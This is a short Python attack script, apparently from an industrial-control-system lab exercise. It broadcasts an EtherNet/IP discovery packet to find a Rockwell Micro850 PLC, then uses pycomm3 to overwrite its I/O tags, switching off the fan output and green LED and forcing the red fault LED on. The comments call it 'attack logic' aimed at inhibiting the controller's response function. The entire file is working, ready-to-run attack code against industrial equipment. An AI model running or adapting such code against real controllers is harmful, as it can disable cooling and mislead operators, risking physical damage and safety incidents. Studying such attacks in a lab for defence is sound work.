from pycomm3 import CIPDriver
import socket
import struct
import sys

# Step 1: Discover PLC's IP (Using UDP Ethernet/IP Enumeration)
def discover_plc_ip():
    UDP_IP = "255.255.255.255"  # Broadcast
    UDP_PORT = 44818  # Rockwell Ethernet/IP Port
    msg = (
        b"\x63\x00\x02\x00\x00\x00\x00\x00"  # Encapsulated packet request
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
    )

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(3)
        sock.sendto(msg, (UDP_IP, UDP_PORT))
        
        data, addr = sock.recvfrom(1024)  # Receive response
        plc_ip = addr[0]
        print(f"[+] PLC Detected at IP: {plc_ip}")
        return plc_ip
    except Exception as e:
        print(f"[-] PLC Discovery Failed: {e}")
        sys.exit(1)


# Step 2: Connect to PLC and Modify I/O Image
def manipulate_io_image(plc_ip):
    # Connect to Rockwell Micro850 PLC
    with CIPDriver(f"{plc_ip}") as plc:
        if plc.connected:
            print(f"[+] Connected to PLC at {plc_ip}")

            # Inhibiting Response Function by Manipulating I/O
            print("[*] Overriding I/O Image...")

            # Force _IO_EM_DO_02 (Fan Output) to FALSE
            plc.write_tag('_IO_EM_DO_02', False)
            print("[+] Fan Output (_IO_EM_DO_02) Set to FALSE")

            # Force _IO_EM_DO_07 (Green LED) to FALSE
            plc.write_tag('_IO_EM_DO_07', False)
            print("[+] Green LED (_IO_EM_DO_07) Set to FALSE")

            # Optionally override _IO_EM_DO_06 (Red LED) to create a controlled fault
            plc.write_tag('_IO_EM_DO_06', True)
            print("[+] Red LED (_IO_EM_DO_06) Set to TRUE (Fault Indication)")

            print("[+] I/O Manipulation Completed.")
        else:
            print("[-] Failed to Connect to PLC")
            sys.exit(1)


# Execute attack logic
if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    manipulate_io_image(plc_ip)